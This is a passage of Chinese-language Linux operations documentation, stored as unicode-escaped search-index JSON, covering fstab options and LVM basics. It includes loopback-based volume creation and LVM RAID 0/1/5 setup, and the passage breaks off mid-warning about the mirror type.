\u200b\u4f1a\u200b\u914d\u7f6e\u200b\u542f\u52a8\u200b\u65f6\u200b\u5728\u200b\u7f51\u7edc\u200b\u914d\u7f6e\u200b\u597d\u200b\u4e4b\u540e\u200b\u624d\u200b\u6302\u8f7d\u200b\u3002 \u200b\u8fd9\u4e2a\u200b\u9009\u9879\u200b\u5728\u200b\u6302\u8f7d\u200b\u57fa\u4e8e\u200b\u7f51\u7edc\u200b\u7684\u200b\u5b58\u50a8\u200b\u65f6\u200b\u975e\u5e38\u200b\u6709\u7528\u200b\u3002</p> <p>\"dump\" \u200b\u53ef\u4ee5\u200b\u5ffd\u7565\u200b\uff080 \u200b\u5373\u53ef\u200b\uff09\uff0c\u200b\u800c\u200b \"pass\" \u200b\u6807\u8bb0\u200b\u4e86\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u68c0\u67e5\u200b\uff08fsck\uff09\u200b\u7684\u200b\u987a\u5e8f\u200b\uff1a0 \u200b\u4e0d\u200b\u68c0\u67e5\u200b\uff0c\u200b\u6839\u200b\u5206\u533a\u200b\u5e94\u8be5\u200b\u4e3a\u200b 1\uff0c\u200b\u5176\u4ed6\u200b\u5206\u533a\u200b\u4e3a\u200b 2\u3002</p> <p>\u200b\u5728\u200b\u4fee\u6539\u200b\u914d\u7f6e\u200b\u540e\u200b\uff0c\u200b\u5982\u679c\u200b\u7cfb\u7edf\u200b\u4f7f\u7528\u200b\u4e86\u200b systemd\uff0c\u200b\u5e94\u5f53\u200b\u4f7f\u7528\u200b <code>systemctl daemon-reload</code> \u200b\u6765\u200b\u8ba9\u200b systemd \u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\u6240\u6709\u200b\u7684\u200b mount \u200b\u5355\u5143\u200b\u3002 \u200b\u5426\u5219\u200b <code>mount -a</code> \u200b\u4e4b\u540e\u200b\uff0csystemd \u200b\u53ef\u80fd\u200b\u4f1a\u200b\u300c\u200b\u597d\u5fc3\u200b\u300d\u200b\u5730\u5e2e\u200b\u4f60\u200b\u6539\u56de\u6765\u200b\u3002</p>"},{"location":"ops/storage/intro/#supplement","title":"\u8865\u5145\u200b\u9605\u8bfb","text":"<p>\u200b\u5bf9\u200b Linux \u200b\u865a\u62df\u673a\u200b\u4e0a\u200b\u7684\u200b\u6c38\u4e45\u6027\u200b\u78c1\u76d8\u200b\u6027\u80fd\u200b\u8fdb\u884c\u200b\u57fa\u51c6\u200b\u6d4b\u8bd5\u200b\uff1aGCE \u200b\u5173\u4e8e\u200b\u4f7f\u7528\u200b fio \u200b\u8fdb\u884c\u200b\u78c1\u76d8\u200b\u6027\u80fd\u200b\u6d4b\u8bd5\u200b\u7684\u200b\u6587\u6863\u200b\u3002</p> <ol> <li> <p>IOPS \u200b\u4e3a\u200b\u6bcf\u79d2\u200b\u7684\u200b I/O \u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7b80\u5355\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u547d\u4ee4\u200b\u64cd\u4f5c\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u5012\u6570\u200b\u3002\u00a0\u21a9</p> </li> </ol>"},{"location":"ops/storage/lvm/","title":"LVM","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p> <p>\u200b\u672c\u6587\u200b\u5c06\u200b\u4ecb\u7ecd\u200b\u5e38\u89c1\u200b LVM \u200b\u7279\u6027\u200b\u7684\u200b\u4f7f\u7528\u200b\u4e0e\u200b\u7ef4\u62a4\u200b\u3002</p> <p>LVM\uff08Logical Volume Manager\uff09\u200b\u662f\u200b Linux \u200b\u4e0b\u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b\u7ba1\u7406\u5668\u200b\uff0c\u200b\u57fa\u4e8e\u200b\u5185\u6838\u200b\u7684\u200b device mapper\uff08dm\uff09\u200b\u529f\u80fd\u200b\u3002 \u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u76f4\u63a5\u200b\u5728\u200b\u521b\u5efa\u200b\u5206\u533a\u8868\u200b\u540e\u200b\u4f7f\u7528\u200b\u5206\u533a\u200b\uff0cLVM \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u66f4\u52a0\u200b\u7075\u6d3b\u200b\u7684\u200b\u5b58\u50a8\u7ba1\u7406\u200b\u65b9\u5f0f\u200b\uff1a</p> <ul> <li>LVM \u200b\u53ef\u4ee5\u200b\u7ba1\u7406\u200b\u591a\u4e2a\u200b\u786c\u76d8\u200b\uff08\u200b\u7269\u7406\u200b\u5377\u200b\uff09\u200b\u4e0a\u200b\u7684\u200b\u5b58\u50a8\u7a7a\u95f4\u200b</li> <li>LVM \u200b\u4e2d\u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b\u53ef\u4ee5\u200b\u8de8\u8d8a\u200b\u591a\u4e2a\u200b\u7269\u7406\u200b\u5377\u200b\uff0c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0d\u200b\u9700\u8981\u200b\u5173\u5fc3\u200b\u7269\u7406\u200b\u5377\u200b\u7684\u200b\u4f4d\u7f6e\u200b</li> <li>LVM \u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b\u53ef\u4ee5\u200b\u52a8\u6001\u200b\u8c03\u6574\u200b\u5927\u5c0f\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u9700\u8981\u200b\u79fb\u52a8\u200b\u5206\u533a\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u2014\u2014\u200b\u79fb\u52a8\u200b\u5206\u533a\u200b\u7684\u200b\u8d77\u59cb\u200b\u4f4d\u7f6e\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5371\u9669\u200b\u4e14\u200b\u8017\u65f6\u200b\u7684\u200b\u64cd\u4f5c\u200b</li> </ul> <p>\u200b\u4e00\u4e9b\u200b Linux \u200b\u53d1\u884c\u7248\u200b\u7684\u200b\u5b89\u88c5\u7a0b\u5e8f\u200b\u9ed8\u8ba4\u200b\u4f7f\u7528\u200b LVM \u200b\u6765\u200b\u7ba1\u7406\u200b\u78c1\u76d8\u200b\uff0c\u200b\u4f8b\u5982\u200b Fedora\u3001CentOS \u200b\u7b49\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5b9e\u9645\u200b\u4f7f\u7528\u200b LVM\uff0c\u200b\u4e5f\u200b\u63a8\u8350\u200b\u9605\u8bfb\u200b\u6765\u81ea\u200b\u7ea2\u5e3d\u200b RHEL \u200b\u7684\u200b LVM \u200b\u7ba1\u7406\u200b\u6307\u5357\u200b<sup>1</sup>\u3002</p> <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u65e0\u6cd5\u200b\u6db5\u76d6\u200b\u5168\u90e8\u5185\u5bb9\u200b</p> <p>LVM \u200b\u5305\u542b\u200b\u4e86\u200b\u5f88\u591a\u200b\u529f\u80fd\u200b\uff0c\u200b\u5728\u200b\u672c\u4efd\u200b\u6587\u6863\u200b\u4e2d\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u9762\u9762\u4ff1\u5230\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6211\u4eec\u200b\u4ec5\u200b\u4ecb\u7ecd\u200b\u5728\u200b LUG \u200b\u4e0e\u200b Vlab \u200b\u9879\u76ee\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u8fc7\u200b\u7684\u200b\u529f\u80fd\u200b\u3002</p>"},{"location":"ops/storage/lvm/#basic","title":"\u57fa\u7840\u200b\u6982\u5ff5","text":"<p>LVM \u200b\u4e2d\u6709\u200b\u4e09\u4e2a\u200b\u57fa\u672c\u6982\u5ff5\u200b\uff1a</p> <ul> <li>\u200b\u7269\u7406\u200b\u5377\u200b\uff08Physical Volume\uff0cPV\uff09\uff1a\u200b\u901a\u5e38\u200b\u662f\u200b\u4e00\u5757\u200b\u786c\u76d8\u200b\uff08\u200b\u5206\u533a\u200b\uff09</li> <li>\u200b\u5377\u7ec4\u200b\uff08Volume Group\uff0cVG\uff09\uff1a\u200b\u7531\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\u7269\u7406\u200b\u5377\u200b\u7ec4\u6210\u200b</li> <li>\u200b\u903b\u8f91\u200b\u5377\u200b\uff08Logical Volume\uff0cLV\uff09\uff1a\u200b\u5728\u200b\u5377\u200b\u7ec4\u91cc\u200b\u5206\u914d\u200b\u7684\u200b\u903b\u8f91\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u3002\u200b\u79f0\u4e4b\u4e3a\u200b\u300c\u200b\u903b\u8f91\u200b\u300d\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u8de8\u8d8a\u200b\u591a\u4e2a\u200b\u7269\u7406\u200b\u5377\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b</li> </ul> <p>\u200b\u8fd9\u91cc\u200b\u6211\u4eec\u200b\u521b\u5efa\u200b\u4e09\u4e2a\u200b 1GB \u200b\u7684\u200b\u6587\u4ef6\u200b\u4f5c\u4e3a\u200b\u7269\u7406\u200b\u5377\u200b\uff0c\u200b\u5e76\u4e14\u200b\u52a0\u5165\u200b\u5230\u200b\u4e00\u4e2a\u200b\u5377\u200b\u7ec4\u4e2d\u200b\uff1a</p> <p>\u200b\u907f\u514d\u200b\u5728\u200b\u7269\u7406\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u521b\u5efa\u200b\u65e0\u200b\u5206\u533a\u8868\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b/\u200b\u7269\u7406\u200b\u5377\u200b</p> <p>\u200b\u5728\u5b9e\u8df5\u4e2d\u200b\uff0c\u200b\u5c3d\u7ba1\u200b\u6280\u672f\u200b\u4e0a\u200b\u53ef\u884c\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u521b\u5efa\u200b\u5206\u533a\u8868\u200b\u3001\u200b\u76f4\u63a5\u200b\u5c06\u200b\u6574\u4e2a\u200b\u78c1\u76d8\u683c\u5f0f\u200b\u5316\u4e3a\u200b\u67d0\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u6216\u8005\u200b\u52a0\u5165\u200b LVM \u200b\u4e2d\u662f\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u7684\u200b\u3002 \u200b\u8fd9\u4f1a\u200b\u7ed9\u200b\u5176\u4ed6\u4eba\u200b\u5e26\u6765\u200b\u56f0\u60d1\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5982\u679c\u200b\u672a\u6765\u200b\u6709\u200b\u5728\u200b\u5bf9\u5e94\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u542f\u52a8\u200b\u7cfb\u7edf\u200b\u7b49\u200b\u9700\u8981\u200b\u591a\u200b\u5206\u533a\u200b\u7684\u200b\u9700\u6c42\u200b\uff0c\u200b\u4f1a\u200b\u5e26\u6765\u200b\u5f88\u591a\u200b\u9ebb\u70e6\u200b\uff08\u200b\u53ef\u80fd\u200b\u53ea\u80fd\u200b\u5907\u4efd\u200b\u6570\u636e\u200b\u540e\u200b\u4ece\u5934\u518d\u6765\u200b\uff09\u3002</p> <p>\u200b\u76f4\u63a5\u200b\u5bf9\u200b\u7269\u7406\u200b\u78c1\u76d8\u200b\u8bbe\u5907\u200b\u683c\u5f0f\u5316\u200b\u4e3a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e5f\u200b\u662f\u200b\u64cd\u4f5c\u200b\u65f6\u200b\u5e38\u89c1\u200b\u7684\u200b\u8f93\u5165\u200b\u9519\u8bef\u200b\uff1a</p> <pre><code>$ mkfs.ext4 /dev/sdz  # \u200b\u9519\u8bef\u200b \u274c\n$ mkfs.ext4 /dev/sdz1 # \u200b\u6b63\u786e\u200b \u2705\n</code></pre> <p>\u200b\u5728\u200b\u4e0b\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u7b80\u5316\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6211\u4eec\u200b\u5047\u8bbe\u200b pv[1-3].img \u200b\u76f8\u5f53\u4e8e\u200b\u6bcf\u5757\u200b\u786c\u76d8\u200b\u4e0a\u200b\u4f7f\u7528\u200b\u5168\u90e8\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5206\u533a\u200b\u3002</p> <pre><code>$ truncate -s 1G pv1.img pv2.img pv3.img\n$ sudo losetup -f --show pv1.img\n/dev/loop0\n$ sudo losetup -f --show pv2.img\n/dev/loop1\n$ sudo losetup -f --show pv3.img\n/dev/loop2\n$ sudo pvcreate /dev/loop0 /dev/loop1 /dev/loop2  # \u200b\u521b\u5efa\u200b\u7269\u7406\u200b\u5377\u200b\n  Physical volume \"/dev/loop0\" successfully created.\n  Physical volume \"/dev/loop1\" successfully created.\n  Physical volume \"/dev/loop2\" successfully created.\n$ sudo vgcreate vg201-test /dev/loop0 /dev/loop1 /dev/loop2  # \u200b\u521b\u5efa\u200b\u5377\u7ec4\u200b\n  Volume group \"vg201-test\" successfully created\n$ sudo pvs  # \u200b\u67e5\u770b\u200b\u7269\u7406\u200b\u5377\u200b\u4fe1\u606f\u200b\n  PV         VG         Fmt  Attr PSize    PFree   \n  /dev/loop0 vg201-test lvm2 a--  1020.00m 1020.00m\n  /dev/loop1 vg201-test lvm2 a--  1020.00m 1020.00m\n  /dev/loop2 vg201-test lvm2 a--  1020.00m 1020.00m\n$ sudo vgs  # \u200b\u67e5\u770b\u200b\u5377\u7ec4\u200b\u4fe1\u606f\u200b\n  VG         #PV #LV #SN Attr   VSize  VFree \n  vg201-test   3   0   0 wz--n- &lt;2.99g &lt;2.99g\n$ sudo lvcreate -n lvol0 -L 2.5G vg201-test  # \u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b 2.5G \u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b\n  Logical volume \"lvol0\" created.\n$ sudo lvs  # \u200b\u67e5\u770b\u200b\u903b\u8f91\u200b\u5377\u200b\u4fe1\u606f\u200b\n  LV    VG         Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert\n  lvol0 vg201-test -wi-a----- 2.50g\n$ ls -lh /dev/mapper/\ntotal 0\ncrw------- 1 root root 10, 236 Feb 11 13:30 control\nlrwxrwxrwx 1 root root       7 Feb 12 00:09 vg201--test-lvol0 -&gt; ../dm-0\n$ # /dev/mapper/vg201--test-lvol0 \u200b\u5c31\u662f\u200b\u6211\u4eec\u200b\u521b\u5efa\u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b\uff08\u200b\u5757\u200b\u8bbe\u5907\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e0a\u9762\u200b\u521b\u5efa\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002\n$ # \u200b\u5bf9\u5e94\u200b\u7684\u200b\u8bbe\u5907\u200b\u6587\u4ef6\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b /dev/vg201-test/ \u200b\u91cc\u9762\u200b\u627e\u5230\u200b\n$ sudo lvchange -an vg201-test/lvol0  # \u200b\u53d6\u6d88\u200b\u6fc0\u6d3b\u200b (disactivate) \u200b\u521a\u624d\u200b\u521b\u5efa\u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b\n$ sudo lvs\n  LV    VG         Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert\n  lvol0 vg201-test -wi------- 2.50g \n$ sudo losetup -D  # \u200b\u5378\u8f7d\u200b\u672c\u5730\u200b\u56de\u73af\u200b\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u518d\u6b21\u200b\u6302\u8f7d\u200b\uff1a</p> <pre><code>$ sudo losetup -f --show pv1.img\n/dev/loop0\n$ sudo losetup -f --show pv2.img\n/dev/loop1\n$ sudo losetup -f --show pv3.img\n/dev/loop2\n$ sudo pvs  # \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u7269\u7406\u200b\u5377\u200b\u88ab\u200b\u81ea\u52a8\u8bc6\u522b\u200b\u4e86\u200b\n  PV         VG         Fmt  Attr PSize    PFree  \n  /dev/loop0 vg201-test lvm2 a--  1020.00m      0 \n  /dev/loop1 vg201-test lvm2 a--  1020.00m      0 \n  /dev/loop2 vg201-test lvm2 a--  1020.00m 500.00m\n$ sudo lvchange -ay vg201-test/lvol0  # \u200b\u6fc0\u6d3b\u200b LV\n$ sudo lvs\n  LV    VG         Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert\n  lvol0 vg201-test -wi-a----- 2.50g\n</code></pre> <p>\u200b\u7b49\u7b49\u200b\uff0c\u200b\u600e\u4e48\u200b\u6bcf\u5757\u200b\u76d8\u5c11\u200b\u4e86\u200b\u51e0\u200b MB \u200b\u7a7a\u95f4\u200b\uff1f</p> <p>\u200b\u5176\u5b9e\u200b\u5927\u6982\u200b\u53ef\u4ee5\u200b\u731c\u200b\u5230\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u7a7a\u95f4\u200b\u7559\u7ed9\u200b\u4e86\u200b LVM \u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\u3002LVM \u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\u4e3a\u200b\u7eaf\u200b\u6587\u672c\u683c\u5f0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5b58\u50a8\u200b\u76f8\u5bf9\u200b\u590d\u6742\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e5f\u200b\u5e26\u6765\u200b\u4e86\u200b\u4e0b\u8ff0\u200b\u4e24\u4e2a\u200b\u95ee\u9898\u200b\uff1a</p> <ul> <li>LVM \u200b\u7684\u200b\u5143\u200b\u6570\u636e\u683c\u5f0f\u200b\u6ca1\u6709\u200b\u4e66\u9762\u200b\u7684\u200b\u6807\u51c6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5176\u4ed6\u8f6f\u4ef6\u200b\u5728\u200b\u89e3\u6790\u200b LVM \u200b\u5143\u200b\u6570\u636e\u200b\u65f6\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b\u3002\u200b\u79d1\u5927\u200b\u955c\u50cf\u200b\u7ad9\u200b\u7684\u200b\u673a\u5668\u200b\u5c31\u200b\u9047\u5230\u200b\u8fc7\u200b GRUB \u200b\u89e3\u6790\u200b LVM \u200b\u5143\u200b\u6570\u636e\u200b\u4ee3\u7801\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u65e0\u6cd5\u200b\u6b63\u786e\u200b\u914d\u7f6e\u200b\u542f\u52a8\u5668\u200b\u3002 \u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\u76f4\u5230\u73b0\u5728\u200b\u90fd\u200b\u6ca1\u6709\u200b\u88ab\u200b GRUB \u200b\u4fee\u590d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ea\u80fd\u200b\u81ea\u884c\u200b\u7f16\u8bd1\u200b\u624b\u52a8\u200b\u4fee\u590d\u200b\u540e\u200b\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u56fa\u5b9a\u200b GRUB \u200b\u7248\u672c\u200b\u3002</li> <li>LVM \u200b\u7684\u200b\u7eaf\u200b\u6587\u672c\u683c\u5f0f\u200b\u5bfc\u81f4\u200b\u5143\u200b\u6570\u636e\u200b\u672c\u8eab\u200b\u8f83\u5927\u200b\uff0c\u200b\u5982\u679c\u200b\u9884\u200b\u5206\u914d\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\u7a7a\u95f4\u200b\u4e0d\u8db3\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5377\u200b\u7ec4\u4e2d\u200b\u6709\u200b\u5927\u91cf\u200b\u903b\u8f91\u200b\u5377\u200b\uff08\u200b\u9ed8\u8ba4\u503c\u200b + \u200b\u4e0a\u200b\u5343\u4e2a\u200b LV \u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b\uff09\uff0c\u200b\u90a3\u4e48\u200b\u6700\u540e\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u65e0\u6cd5\u200b\u518d\u200b\u521b\u5efa\u200b/\u200b\u6269\u5bb9\u200b\u903b\u8f91\u200b\u5377\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u80fd\u200b\u901a\u8fc7\u200b\u6dfb\u52a0\u200b\u65b0\u200b\u7684\u200b\u7269\u7406\u200b\u5377\u200b\uff0c\u200b\u7136\u540e\u200b\u7531\u8be5\u200b\u5377\u200b\u5b58\u50a8\u200b\u5143\u200b\u6570\u636e\u200b\u6765\u200b\u89e3\u51b3\u95ee\u9898\u200b\u3002Vlab \u200b\u9879\u76ee\u200b\u66fe\u200b\u9047\u5230\u200b\u8fc7\u200b\u8fd9\u6837\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</li> </ul> <p>\u200b\u8fd9\u91cc\u200b\u521b\u5efa\u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b\u6a2a\u8de8\u200b\u4e86\u200b\u4e09\u5757\u200b\u76d8\u200b\uff0c\u200b\u6240\u4ee5\u200b LVM \u200b\u9ed8\u8ba4\u200b\u662f\u200b RAID 0\uff1f</p> <p>\u200b\u8fd9\u200b\u662f\u200b\u4e0d\u200b\u6b63\u786e\u200b\u7684\u200b\u3002\u200b\u8fd9\u91cc\u200b\u903b\u8f91\u200b\u5377\u200b\u7684\u200b\u6570\u636e\u200b\u5e03\u5c40\u200b\u4e0e\u200b RAID 0 \u200b\u4e0d\u540c\u200b\u3002RAID 0 \u200b\u8003\u8651\u200b\u7684\u200b\u662f\u200b\u6027\u80fd\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6570\u636e\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u8fd9\u4e48\u200b\u5b58\u50a8\u200b\uff1a</p> Disk 1 Disk 2 Disk 3 0 1 2 3 4 5 6 7 8 ... ... ... <p>\u200b\u8fd9\u6837\u7684\u8bdd\u200b\uff0c\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\u65f6\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u591a\u5757\u200b\u76d8\u200b\u7684\u200b\u5e76\u884c\u200b\u8bfb\u5199\u80fd\u529b\u200b\u3002\u200b\u4f46\u662f\u200b LVM \u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u8fd9\u6837\u200b\uff1a</p> Disk 1 Disk 2 Disk 3 0 100000 200000 1 100001 200001 2 100002 200002 ... ... ... <p>\u200b\u6bcf\u5757\u200b\u76d8\u200b\u662f\u200b\u987a\u5e8f\u200b\u586b\u5145\u200b\u7684\u200b\u3002\u200b\u8fd9\u6837\u200b\u505a\u200b\u53ef\u4ee5\u200b\u66f4\u52a0\u200b\u7075\u6d3b\u200b\u5730\u200b\u7ba1\u7406\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u4f46\u662f\u200b\u6027\u80fd\u200b\u4e0d\u5982\u200b RAID 0\u3002</p> <p>LVM \u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u521b\u5efa\u200b RAID 0 \u200b\u903b\u8f91\u200b\u5377\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u300c\u200b\u6761\u5e26\u200b\u5316\u200b\u300d\uff08Striped\uff09\u200b\u5377\u200b\uff0c\u200b\u4e0a\u9762\u200b\u9ed8\u8ba4\u200b\u751f\u6210\u200b\u7684\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u300c\u200b\u7ebf\u6027\u200b\u300d\uff08Linear\uff09\u200b\u5377\u200b\u3002</p>"},{"location":"ops/storage/lvm/#raid","title":"\u521b\u5efa\u200b RAID","text":"<p>\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b LVM \u200b\u6784\u5efa\u200b RAID</p> <p>\u200b\u76f8\u6bd4\u200b\u4e8e\u200b mdadm\uff0cLVM \u200b\u4e0e\u200b RAID \u200b\u76f8\u5173\u200b\u7684\u200b\u6982\u5ff5\u200b\u4e0e\u200b\u63d0\u4f9b\u200b\u7684\u200b\u5de5\u5177\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u79cd\u200b\u590d\u6742\u6027\u200b\u5728\u200b\u5f88\u591a\u200b\u573a\u666f\u200b\u4e0b\u200b\u6ca1\u6709\u200b\u6536\u76ca\u200b\u3002 \u200b\u66f4\u52a0\u200b\u5e38\u89c1\u200b\u7684\u200b\u6a21\u5f0f\u200b\u662f\u200b\uff0c\u200b\u4f7f\u7528\u200b mdadm \u200b\u6784\u5efa\u200b RAID\uff0c\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b LVM \u200b\u7ba1\u7406\u200b\u6784\u5efa\u200b\u597d\u200b\u7684\u200b RAID \u200b\u4e0a\u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b\u3002</p> <p>LVM \u200b\u4e0e\u200b mdadm \u200b\u4f7f\u7528\u200b\u7684\u200b\u90fd\u200b\u662f\u200b\u5185\u6838\u200b\u7684\u200b md \u200b\u6a21\u5757\u200b\u3002\u200b\u5373\u4f7f\u200b\u6700\u7ec8\u200b\u4f7f\u7528\u200b LVM \u200b\u6784\u5efa\u200b RAID\uff0c\u200b\u4e5f\u200b\u5efa\u8bae\u200b\u7b80\u5355\u200b\u9605\u8bfb\u200b\u540e\u200b\u4e00\u8282\u200b\u5173\u4e8e\u200b mdadm \u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p> <p>\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u591a\u76d8\u200b\u573a\u666f\u200b\uff0c\u200b\u4e0a\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u663e\u7136\u200b\u662f\u200b\u4e0d\u200b\u6ee1\u8db3\u200b\u9700\u6c42\u200b\u7684\u200b\uff1a\u200b\u521b\u5efa\u200b\u51fa\u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b\u4ecd\u7136\u200b\u662f\u200b\u6709\u200b\u4e00\u5757\u200b\u76d8\u200b\u574f\u6389\u200b\u5c31\u200b\u4f1a\u200b\u6545\u969c\u200b\u7684\u200b\u72b6\u6001\u200b\u3002 \u200b\u4ee5\u4e0b\u200b\u5c55\u793a\u200b\u4e86\u200b RAID0, 1, 5 \u200b\u7684\u200b\u521b\u5efa\u200b\u65b9\u5f0f\u200b\uff1a</p> <pre><code>$ sudo lvremove vg201-test/lvol0  # \u200b\u5220\u9664\u200b\u521a\u624d\u200b\u7684\u200b LV\uff0c\u200b\u817e\u51fa\u200b\u4e00\u4e9b\u200b\u7a7a\u95f4\u200b\nDo you really want to remove active logical volume vg201-test/lvol0? [y/n]: y\n  Logical volume \"lvol0\" successfully removed.\n$ # RAID 0 (striped)\u3002--stripes \u200b\u53c2\u6570\u200b\u6307\u5b9a\u200b\u4e86\u200b\u6761\u5e26\u200b\u7684\u200b\u6570\u91cf\u200b\uff0c\u200b\u6b63\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u548c\u76d8\u200b\u6570\u91cf\u200b\u4e00\u81f4\u200b\n$ sudo lvcreate -n lvraid0 -L 0.5G --type striped --stripes 3 vg201-test\n  Using default stripesize 64.00 KiB.\n  Logical volume \"lvraid0\" created.\n$ # RAID 1\u3002--mirrors \u200b\u53c2\u6570\u200b\u6307\u5b9a\u200b\u4e86\u200b\u526f\u672c\u200b\u6570\u91cf\u200b\uff08\u200b\u4e0d\u200b\u542b\u200b\u672c\u4f53\u200b\uff09\uff0c\u200b\u6240\u4ee5\u200b\u662f\u200b\u76d8\u200b\u6570\u91cf\u200b\u51cf\u4e00\u200b\n$ sudo lvcreate -n lvraid1 -L 0.5G --type raid1 --mirrors 2 vg201-test\n  Logical volume \"lvraid1\" created.\n$ # \u200b\u56e0\u4e3a\u200b\u53ea\u6709\u200b 3 \u200b\u5757\u200b\u76d8\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c55\u793a\u200b RAID 5\u3002--stripes \u200b\u53c2\u6570\u200b\u4e0d\u200b\u5305\u542b\u200b\u989d\u5916\u200b\u7684\u200b\u9a8c\u8bc1\u200b\u76d8\u200b\u3002\n$ sudo lvcreate -n lvraid5 -L 0.2G --type raid5 --stripes 2 vg201-test\n  Using default stripesize 64.00 KiB.\n  Rounding up size to full physical extent 208.00 MiB\n  Logical volume \"lvraid5\" created.\n$ sudo lvs\n  LV      VG         Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert\n  lvraid0 vg201-test -wi-a----- 516.00m                                                    \n  lvraid1 vg201-test rwi-a-r--- 512.00m                                    100.00          \n  lvraid5 vg201-test rwi-a-r--- 208.00m                                    100.00\n</code></pre> <p>\u200b\u4e0d\u8981\u200b\u4f7f\u7528\u200b <code>--type mirror</code></p> <p><code>mirror</code> \u200b\u548c\u200b <code>raid1</code> \u200b\u662f\u200b\u4e24\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b 